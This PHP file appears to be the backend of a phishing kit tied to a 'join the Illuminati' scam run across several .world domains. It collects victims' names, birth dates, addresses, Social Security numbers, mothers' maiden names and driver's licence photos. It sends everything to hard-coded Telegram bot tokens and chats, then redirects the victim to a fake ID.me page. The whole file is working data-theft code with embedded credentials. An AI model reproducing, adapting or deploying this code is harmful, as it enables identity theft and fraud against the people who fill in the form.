<?php
ob_start();

$site_map = [


        'illuminatigroup.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8459891488:AAHBwkSpyaRAtGCI6yWm_-39c61LJhQgI4w', 'chat_id' => '5978851707'],
        ],
        "redirect" => "https://illuminatigroup.world/api.id.me/en/session/new.html"
    ],

    'illuminatiglobal.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8572613269:AAEMx8dbCNQnUHfKtZ5kuhpVfjE6fBdhofw', 'chat_id' => '6512010552'],
        ],
        "redirect" => "https://illuminatiglobal.world/api.id.me/en/session/new.html"
    ],

    'illuminatinetwork.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8233162319:AAGUMse4WldCYNsGerfsU2FDnmY-_Heo-yM', 'chat_id' => '6944000447'],
        ],
        "redirect" => "https://illuminatinetwork.world/api.id.me/en/session/new.html"
    ],

    'illuminaticonnect.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8578491453:AAFjqP9TdTwv4IpsCJdghljt28y0yHqnYD8', 'chat_id' => '1972703470'],
        ],
        "redirect" => "https://illuminaticonnect.world/api.id.me/en/session/new.html"
    ],


    'illuminatipath.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8491692614:AAHhTPb4DRwkvmJa0SjF00v5x8kNWA82xfk', 'chat_id' => '6378885812'],
        ],
        "redirect" => "https://illuminatipath.world/api.id.me/en/session/new.html"
    ],

    'illuminatisyndicate.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8531352805:AAFN91n2L76y7WKwB159QFRNtvCnLu_uM9M', 'chat_id' => '7875523533'],
        ],
        "redirect" => "https://illuminatisyndicate.world/api.id.me/en/session/new.html"
    ],

    'illuminatilight.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8064658016:AAHEcSX8Y981ebjcAveqjyh-S8sGkrGnYiq4', 'chat_id' => '7575811693'],
        ],
        "redirect" => "https://illuminatilight.world/api.id.me/en/session/new.html"
    ],


    'illuminatisacred.world' => [
        "bots" => [
            ['token' => '8491989105:AAHZ_rUqbKxZSPfiEEIQ3w_KPyO4N9XSyZw', 'chat_id' => '1325797388'],
            ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040'],
        ],
        "redirect" => "https://illuminatisacred.world/api.id.me/en/session/new.html"
    ],



];

$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';
$config = $site_map[$domain] ?? null;

if (!$config) {
    http_response_code(403);
    exit("Unauthorized origin.");
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $log_file = __DIR__ . "/logs/illuminati_applications.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true);
    }

    function log_entry($msg) {
        global $log_file;
        file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
    }

    $fname = htmlspecialchars($_POST['FNAME'] ?? '');
    $lname = htmlspecialchars($_POST['LNAME'] ?? '');
    $full_name = trim("$fname $lname");
    $dob = htmlspecialchars($_POST['DOB'] ?? '');
    $phone = htmlspecialchars($_POST['PHONE'] ?? '');
    $email = htmlspecialchars($_POST['EMAIL'] ?? '');
    $pob = htmlspecialchars($_POST['POB'] ?? '');
    $street = htmlspecialchars($_POST['STREET'] ?? '');
    $city = htmlspecialchars($_POST['CITY'] ?? '');
    $state = htmlspecialchars($_POST['STATE'] ?? '');
    $zip = htmlspecialchars($_POST['ZIP'] ?? '');
    $country = htmlspecialchars($_POST['COUNTRY'] ?? '');
    $address = "$street, $city, $state $zip, $country";
    $ssn = htmlspecialchars($_POST['SSN'] ?? '');
    $father_name = htmlspecialchars($_POST['FATHER_NAME'] ?? '');
    $mother_name = htmlspecialchars($_POST['MOTHER_NAME'] ?? '');
    $mother_maiden = htmlspecialchars($_POST['MOTHER_MAIDEN'] ?? '');
    $sourcepage = htmlspecialchars($_POST['SOURCEPAGE'] ?? '');

    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_FORWARDED'] ?? 
          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_FORWARDED'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }

    function uploadFile($key, $prefix) {
        if (!isset($_FILES[$key]) || $_FILES[$key]['error'] !== UPLOAD_ERR_OK) {
            return null;
        }

        $upload_dir = __DIR__ . "/uploads/";
        if (!is_dir($upload_dir)) {
            mkdir($upload_dir, 0777, true);
        }

        $original = $_FILES[$key]['name'];
        $tmp_name = $_FILES[$key]['tmp_name'];
        $ext = strtolower(pathinfo($original, PATHINFO_EXTENSION));
        
        $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'pdf'];
        if (!in_array($ext, $allowed_extensions)) {
            return null;
        }

        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo, $tmp_name);
        finfo_close($finfo);
        
        $allowed_mimes = [
            'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 
            'image/bmp', 'image/webp', 'application/pdf'
        ];
        
        if (!in_array($mime_type, $allowed_mimes)) {
            return null;
        }

        $safe_name = $prefix . "_" . time() . "_" . bin2hex(random_bytes(4)) . "." . $ext;
        $path = $upload_dir . $safe_name;

        if (move_uploaded_file($tmp_name, $path)) {
            return $path;
        }
        
        return null;
    }

    $dl_front = uploadFile("DL_FRONT", "dl_front");
    $dl_back = uploadFile("DL_BACK", "dl_back");

    $timestamp = date("Y-m-d H:i:s");
    $message = "🔺 *New Illuminati Application*\n\n" .
               "👤 *Name:* $full_name\n" .
               "🎂 *DOB:* $dob\n" .
               "📞 *Phone:* $phone\n" .
               "📧 *Email:* $email\n" .
               "📍 *Place of Birth:* $pob\n" .
               "🏠 *Address:* $address\n" .
               "🔐 *SSN:* $ssn\n" .
               "👨 *Father's Name:* $father_name\n" .
               "👩 *Mother's Name:* $mother_name ($mother_maiden)\n" .
               "🌐 *Source Page:* $sourcepage\n" .
               "🕒 *Submitted:* $timestamp\n" .
               "📡 *IP:* $ip\n" .
               "📎 *ID Uploads:* " . (($dl_front || $dl_back) ? "✅" : "❌");

    foreach ($config['bots'] as $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        $data = ['chat_id' => $bot['chat_id'], 'text' => $message, 'parse_mode' => 'Markdown'];

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_TIMEOUT => 30
        ]);
        curl_exec($ch);
        curl_close($ch);
    }

    function sendFile($file, $caption, $bots) {
        if (!$file || !file_exists($file)) return;
        
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        $is_image = in_array($ext, ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp']);
        $endpoint = $is_image ? "sendPhoto" : "sendDocument";

        foreach ($bots as $bot) {
            if (empty($bot['token']) || empty($bot['chat_id'])) continue;
            
            $url = "https://api.telegram.org/bot{$bot['token']}/$endpoint";
            $payload = [
                'chat_id' => $bot['chat_id'],
                ($is_image ? 'photo' : 'document') => new CURLFile(realpath($file)),
                'caption' => $caption,
                'parse_mode' => 'Markdown'
            ];

            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $payload,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 60
            ]);
            curl_exec($ch);
            curl_close($ch);
        }
    }

    sendFile($dl_front, "📷 *Driver's License Front* - $full_name", $config['bots']);
    sendFile($dl_back, "📷 *Driver's License Back* - $full_name", $config['bots']);

    log_entry("[$domain] Application from $ip - $full_name ($email)");

    ob_end_clean();
    header("Location: " . $config['redirect']);
    exit;
}
?>
